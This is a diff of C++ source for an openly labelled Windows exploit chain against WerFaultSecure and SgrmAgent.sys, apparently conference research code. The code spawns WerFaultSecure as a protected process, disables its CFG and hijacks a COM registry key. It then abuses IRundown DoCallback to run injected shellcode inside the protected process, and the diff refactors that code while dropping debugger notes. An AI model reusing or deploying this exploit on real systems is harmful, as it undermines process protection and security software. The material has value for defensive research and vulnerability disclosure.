@@ -5,11 +5,6 @@
 #include "utils.h"
 
 
-// global vars 
-HANDLE hEvent;
-HANDLE hEncFile;
-HANDLE hFile;
-
 static
 void
 banner()
@@ -19,8 +14,8 @@ banner()
         L"*\tWerFaultSecure & SgrmAgent.sys Process Impairment Chain\n"
         L"*\tExploit chain presented at --> DEF CON 34 <--\n"
         L"*\tPresentation: {link to be updated}\n"
-        L"*\tGitHub: https://www.github.com/lem0nSec/SgrmNightmare\n"
-        L"*\tAngelo Frasca Caccia (lem0nSec_) & Alejandro Pinna (frodosobon)\n"
+        L"*\tGitHub: https://www.github.com/lem0nSec/SgrmFault\n"
+        L"*\tAngelo Frasca Caccia (lem0nSec_) & Alejandro Pinna\n"
         L"*******************************************************************************\n\n");
 
     Sleep(1000);
@@ -34,7 +29,7 @@ usage()
         L"\n"
         L" -h\t: Show this help message\n"
         L" -p\t: AppContainer Process ID\n"
-        L" -t\t: Target process name (case sensitive)\n"
+        L" -t\t: Target process name (case insensitive)\n"
     );
 }
 
@@ -46,6 +41,8 @@ GenerateUnencryptedCrashDump(_In_ DWORD ProcessId, _In_ DWORD ThreadId) {
     BOOL status = FALSE;
     STARTUPINFOEXA StartupInfoExA = { sizeof(StartupInfoExA) };
     PROCESS_INFORMATION ProcessInfo = {};
+    HANDLE hFile{}, hEncFile{}, hEvent{};
+    HANDLE hProcess{}, hThread{};
     std::string cmdLine{};
 
     hFile = CreateFile(
@@ -99,6 +96,9 @@ GenerateUnencryptedCrashDump(_In_ DWORD ProcessId, _In_ DWORD ThreadId) {
         goto Exit;
     }
 
+    hProcess = ProcessInfo.hProcess;
+    hThread = ProcessInfo.hThread;
+
     WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
 
 Exit:
@@ -108,9 +108,15 @@ Exit:
     if (hFile) {
         CloseHandle(hFile);
     }
-
-    CloseHandle(ProcessInfo.hProcess);
-    CloseHandle(ProcessInfo.hThread);
+    if (hEvent) {
+        CloseHandle(hEvent);
+    }
+    if (hProcess) {
+        CloseHandle(hProcess);
+    }
+    if (hThread) {
+        CloseHandle(hThread);
+    }
 
     return status;
 }
@@ -134,9 +140,10 @@ TriggerShellcodeExecution(
     WER_MAPPED_SECTION_PAYLOAD pRemoteSectionMapping{};
 
     // IRundown data
-    IR_PARAMETERS rundownParams{};
-    XAptCallback params{};
+    IR_PARAMETERS irundownParams{};
+    XAptCallback docallbackParams{};
 
+    BOOL status = FALSE;
     HMODULE hNtdll{};
     HMODULE hKernel32{};
     MODULE_SECTION_INFORMATION msInfo{};
@@ -175,7 +182,7 @@ TriggerShellcodeExecution(
         return 0;
     }
 
-    if (!DumpGetIRundownParameters(&rundownParams)) {
+    if (!DumpGetIRundownParameters(&irundownParams)) {
         return 0;
     }
 
@@ -189,7 +196,7 @@ TriggerShellcodeExecution(
     printf("[+] Remote section identified at 0x%-016p\n", pRemoteSection);
 
     IRundown* rndn{};
-    rndn = (IRundown*)IRundownConnect(&rundownParams);
+    rndn = (IRundown*)IRundownConnect(&irundownParams);
     if (!rndn) {
         printf("[-] Remote IRundown connection failed.\n");
         return 0;
@@ -210,17 +217,17 @@ TriggerShellcodeExecution(
 
         pLocalSectionMapping.sampleContext->ContextFlags = CONTEXT_FULL;
 
-        params.guidProcessSecret = rundownParams.secretGUID;
-        params.pServerCtx = (PTRMEM)rundownParams.pContext;
+        docallbackParams.guidProcessSecret = irundownParams.secretGUID;
+        docallbackParams.pServerCtx = (PTRMEM)irundownParams.pContext;
 
         // First DoCallback cycle - RtlCaptureContext
         // RtlCaptureContext(pRemoteSectionMapping.sampleContext)
-        params.pfnCallback = pfnRtlCaptureContex;
-        params.pParam = (PTRMEM)pRemoteSectionMapping.sampleContext;
+        docallbackParams.pfnCallback = pfnRtlCaptureContex;
+        docallbackParams.pParam = (PTRMEM)pRemoteSectionMapping.sampleContext;
         
         printf("[+] DoCallback 1.\n");
         
-        HRESULT hr = rndn->DoCallback(&params);
+        HRESULT hr = rndn->DoCallback(&docallbackParams);
         if (FAILED(hr)) {
             printf("[-] DoCallback error: (0x%x)\n", hr);
             __leave;
@@ -258,20 +265,21 @@ TriggerShellcodeExecution(
 
         // Second DoCallback cycle - WriteProcessMemory
         // WriteProcessMemory(GetCurrentProcess(), WerTextBase, shellcode, sizeof(shellcode), NULL)
-        params.pfnCallback = pfnNtContinue;
+        docallbackParams.pfnCallback = pfnNtContinue;
 
         printf("[+] DoCallback 2. Firing shellcode & waiting...\n");
         
-        hr = rndn->DoCallback(&params);
+        hr = rndn->DoCallback(&docallbackParams);
         rndn->Release();
 
+        status = TRUE;
     }
     __except (GetExceptionCode()) {
         goto exit;
     }
 
 exit:
-    return TRUE;
+    return status;
 
 }
 
@@ -296,7 +304,8 @@ int wmain(int argc, wchar_t* argv[])
             TargetProcessName = argv[++i];
     }
 
-    if (TargetProcessName == nullptr) {
+    if (TargetProcessName == nullptr ||
+        AppContainerProcessId <= 0) {
         usage();
         return 0;
     }
@@ -304,15 +313,11 @@ int wmain(int argc, wchar_t* argv[])
 
     PVOID pShellcode = nullptr;
     DWORD dwShellcodeLength = 0;
-    const wchar_t fileToLock[] = L"C:\\Windows\\System32\\license.rtf";
-    const wchar_t STAData[] = L"Free";
     HANDLE hFile{};
     OVERLAPPED overlapped{};
     HANDLE hFileMap{};
     void* pLocalSharedSection = nullptr;
     PWER_MAPPED_SECTION_HEADER pSectionHeader = nullptr;
-    DWORD processId = 0;
-    DWORD value = 0;
     UUID Uuid{};
     char* randomGuid{};
     HANDLE hProcess{};
@@ -360,8 +365,10 @@ int wmain(int argc, wchar_t* argv[])
         return 0;
     }
 
-    if (!disableCFG()) {
-        printf("Error disabling CFG\n");
+    // CFG must be disabled for WerFaultSecure to be able to
+    // execute the shellcode
+    if (!DisableProcessCFG(L"WerFaultSecure.exe")) {
+        printf("[-] Error disabling CFG for WerFaultSecure.exe\n");
         return 0;
     }
 
@@ -370,6 +377,7 @@ int wmain(int argc, wchar_t* argv[])
     if (!RegKeySetValue(
         L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32",
         NULL,
+        REG_SZ,
         fileToLock,
         (DWORD)((wcslen(fileToLock) + 1) * sizeof(wchar_t)))) {
         printf("[-] Error setting TwinAPI InProcServer32 Default to target file.\n");
@@ -380,6 +388,7 @@ int wmain(int argc, wchar_t* argv[])
     if (!RegKeySetValue(
         L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32",
         L"ThreadingModel",
+        REG_SZ,
         STAData,
         (DWORD)((wcslen(STAData) + 1) * sizeof(wchar_t)))) {
         printf("[-] Error setting TwinAPI InProcServer32 Default to target file.\n");
@@ -414,23 +423,6 @@ int wmain(int argc, wchar_t* argv[])
 
     printf("[+] Section mapped in local process: 0x%-016p\n", pLocalSharedSection);
 
-    // These values have been obtained by reversing faultrep!CCrashReport::LoadCrashData
-    // The method checks the values written to the shared section, so if we don't specify these values, the exploit won't work.
-    // The values come from the following binary:
-    // faultrep.dll version 6.3.9600.17415 (winblue_r4.141028-1500)
-    // Sha1 hash: B241A5B14F8A8E478B27CB79B7552F00AA01C538
-    pSectionHeader = (PWER_MAPPED_SECTION_HEADER)pLocalSharedSection;
-    processId = AppContainerProcessId;
-    value = 0x00F8;
-
-    //processId = FindProcessId(L"CalculatorApp.exe");
-    if (!processId) {
-        printf("[-] Error finding AppContainer process.\n");
-        goto Exit;
-    }
-
-    printf("[+] AppContainer process: %d\n", processId);
-
     // We create a random GUID that enables us to find the shared section later in the WerFaultSecure dump
     // Ref. https://stackoverflow.com/questions/24365331/how-can-i-generate-uuid-in-c-without-using-boost-library
     if (UuidCreate(&Uuid) != RPC_S_OK) {
@@ -446,17 +438,23 @@ int wmain(int argc, wchar_t* argv[])
     printf("[+] Random GUID generated: %s\n", randomGuid);
 
     // Setting up shared section with the required data...
-    pSectionHeader->Unk = value;
-    pSectionHeader->ProcessId = processId;
+    // These values have been obtained by reversing faultrep!CCrashReport::LoadCrashData
+    // The method checks the values written to the shared section, so if we don't specify these values, the exploit won't work.
+    // The values come from the following binary:
+    // faultrep.dll version 6.3.9600.17415 (winblue_r4.141028-1500)
+    // Sha1 hash: B241A5B14F8A8E478B27CB79B7552F00AA01C538
+    pSectionHeader = (PWER_MAPPED_SECTION_HEADER)pLocalSharedSection;
+    pSectionHeader->Unk = 0x00F8;
+    pSectionHeader->ProcessId = AppContainerProcessId;
     RtlCopyMemory(&pSectionHeader->Cookie, randomGuid, sizeof(RPC_CSTR));
     for (unsigned int i = sizeof(WER_MAPPED_SECTION_HEADER); i < 4096; i++) {
-        *(PBYTE)((PBYTE)pLocalSharedSection + i) = 0x41;
+        *(PBYTE)Add2Ptr(pLocalSharedSection, i) = 0x41;
     }
 
     // Open inheritable handle to the AppContainer process.
     // This is just a random AppContainer process that's required to
     // lead WerFaultSecure to initialize COM and IRundown
-    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, processId);
+    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, AppContainerProcessId);
     if (hProcess == INVALID_HANDLE_VALUE || !hProcess) {
         printf("[-] Error opening AppContainer process: (0x%-04x)\n", GetLastError());
         goto Exit;
@@ -484,7 +482,7 @@ int wmain(int argc, wchar_t* argv[])
 
     // Create WerFaultSecure.exe process as PPL with the command line argument -s
     // -s is a handle to a section object that we want WerFaultSecure to map.
-    cmdLine = ".\\werfaultsecure.exe -u -s " + std::to_string(HandleToUlong(hFileMap)) + " -p " + std::to_string(processId);
+    cmdLine = ".\\werfaultsecure.exe -u -s " + std::to_string(HandleToUlong(hFileMap)) + " -p " + std::to_string(AppContainerProcessId);
     StartupInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
     if (!CreateProcessAsPPL((LPSTR)cmdLine.c_str(), &StartupInfo, &ProcessInfo)) {
         printf("[-] Error creating WerFaultSecure.exe process as PPL: (0x%-04x)\n", GetLastError());
@@ -508,18 +506,23 @@ int wmain(int argc, wchar_t* argv[])
     if (!GenerateUnencryptedCrashDump(ProcessInfo.dwProcessId, ProcessInfo.dwThreadId)) {
         goto Exit;
     }
-
+    
     // We trigger the injection here...
-    TriggerShellcodeExecution(
-        pShellcode,                 // SGRM Shellcode
-        dwShellcodeLength,          // Shellcode size
-        pLocalSharedSection,        // Pointer to shared section in current process
-        randomGuid);                // Pattern in the shared section. This is to locate 
-    // the shared section in the dump of the remote WerFaultSecure
+    // Param 1. SGRM Shellcode
+    // Param 2. Shellcode size
+    // Param 3. Pointer to shared section in current process
+    // Param 4. Pattern in the shared section. This is to locate the shared section in the dump of the remote WerFaultSecure
+    if (!TriggerShellcodeExecution(
+        pShellcode,
+        dwShellcodeLength,
+        pLocalSharedSection,
+        randomGuid)) {
+        goto Exit;
+    }
 
-// We hold the lock to license.rtf as long as werfaultsecure.exe lives
-// So we keep the COM server exposing th IRundown interface always alive
-// We expect our own shellcode to call TerminateProcess() once finishes its job
+    // We hold the lock to license.rtf as long as werfaultsecure.exe lives
+    // So we keep the COM server exposing th IRundown interface always alive
+    // We expect our own shellcode to call TerminateProcess() once finishes its job
     WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
 
     printf("[+] Complete.\n");
@@ -530,12 +533,6 @@ Exit:
     }
     if (hFile) {
         CloseHandle(hFile);
-    }
-    if (hEncFile) {
-        CloseHandle(hEncFile);
-    }
-    if (hEvent) {
-        CloseHandle(hEvent);
     }
     if (hFileMap) {
         CloseHandle(hFileMap);
@@ -554,78 +551,3 @@ Exit:
 
     return 0;
 }
-
-
-
-
-
-
-
-
-
-/*0:000> dx -r1 (*((PPLInjection!tagSTDOBJREF *)0xd02e0fe918))
-(*((PPLInjection!tagSTDOBJREF *)0xd02e0fe918))                 [Type: tagSTDOBJREF]
-    [+0x000] flags            : 0x0 [Type: unsigned long]
-    [+0x004] cPublicRefs      : 0x1 [Type: unsigned long]
-    [+0x008] oxid             : 1327832766099251733 [Type: __int64]
-    [+0x010] oid              : 0xcdf99d2bfb87d173 [Type: unsigned __int64]
-    [+0x018] ipid             : {00005C00-1BDC-1EA4-DA7C-67557672B411} [Type: _GUID]
-*/
-
-/*
-ntdll!TppAlpcpExecuteCallback+0x273
-*/
-
-
-/*
-10 00000068`1fcff080 00007ff9`cd775f57     combase!ComInvokeWithLockAndIPID+0x57a [onecore\com\combase\dcomrem\channelb.cxx @ 2722]
-11 00000068`1fcff300 00007ff9`cf4f3bb4     combase!ThreadInvoke+0xe17 [onecore\com\combase\dcomrem\channelb.cxx @ 7096]
-12 00000068`1fcff530 00007ff9`cf4f2cbd     RPCRT4!DispatchToStubInCNoAvrf+0x24
-13 00000068`1fcff580 00007ff9`cf4f37d4     RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1bd
-14 00000068`1fcff650 00007ff9`cf4e10be     RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x154
-15 00000068`1fcff6f0 00007ff9`cf4e1d35     RPCRT4!LRPC_SCALL::DispatchRequest+0x17e
-16 00000068`1fcff7d0 00007ff9`cf4e521e     RPCRT4!LRPC_SCALL::HandleRequest+0x8d5
-17 00000068`1fcff8e0 00007ff9`cf4e6ad8     RPCRT4!LRPC_ADDRESS::HandleRequest
-*/
-
-
-/*
-0:004> dt OXIDEntry @rax
-combase!OXIDEntry
-   +0x000 _flink           : 0x0000023f`e849d9d8 CListElement
-   +0x008 _blink           : (null)
-   +0x010 _dwPid           : 0x1a00
-   +0x014 _dwTid           : 0x128
-   +0x018 _moxid           : _GUID {8e9a6674-3e5a-6ad5-dc14-59417a289970}
-   +0x028 _mid             : 0x7099287a`415914dc
-   +0x030 _ipidRundown     : _GUID {00004800-1a00-0128-896f-77d74c7e75de}
-   +0x040 _dwFlags         : 0x4000203
-   +0x048 _hServerSTA      : 0x00000000`001707aa HWND__
-   +0x050 _pParentApt      : 0x0000023f`e8491cd0 CComApartment
-   +0x058 _pSharedDefaultHandle : (null)
-   +0x060 _pAuthId         : (null)
-   +0x068 _pBinding        : (null)
-   +0x070 _dwAuthnHint     : 1
-   +0x074 _dwAuthnSvc      : 0xffffffff
-   +0x078 _pMIDEntry       : 0x0000023f`e8492100 MIDEntry
-   +0x080 _pRUSTA          : (null)
-   +0x088 _cRefs           : 3
-   +0x090 _hComplete       : (null)
-   +0x098 _cCalls          : 0n0
-   +0x09c _cResolverRef    : 0n0
-   +0x0a0 _dwExpiredTime   : 0
-   +0x0a4 _version         : tagCOMVERSION
-   +0x0a8 _pAppContainerServerSecurityDescriptor : (null)
-   +0x0b0 _ulMarshaledTargetInfoLength : 0
-   +0x0b8 _marshaledTargetInfo : std::unique_ptr<unsigned char [0],DeleteMarshaledTargetInfo>
-   +0x0c0 _pszServerPackageFullName : (null)
-   =00007ff9`cd97fbd0 _palloc          : CPageAllocator
-   +0x0c8 _guidProcessIdentifier : _GUID {36a61051-34f9-4296-b4b5-cdbf0a9e988f}
-*/
-
-
-/*
-00007ff9`cd85b650 combase!CObjectContext::DoCallback (<function> *, void *, struct _GUID *, unsigned int)
-00007ff9`cd74cb40 combase!CRemoteUnknown::DoCallback (struct tagXAptCallback *)
-
-*/
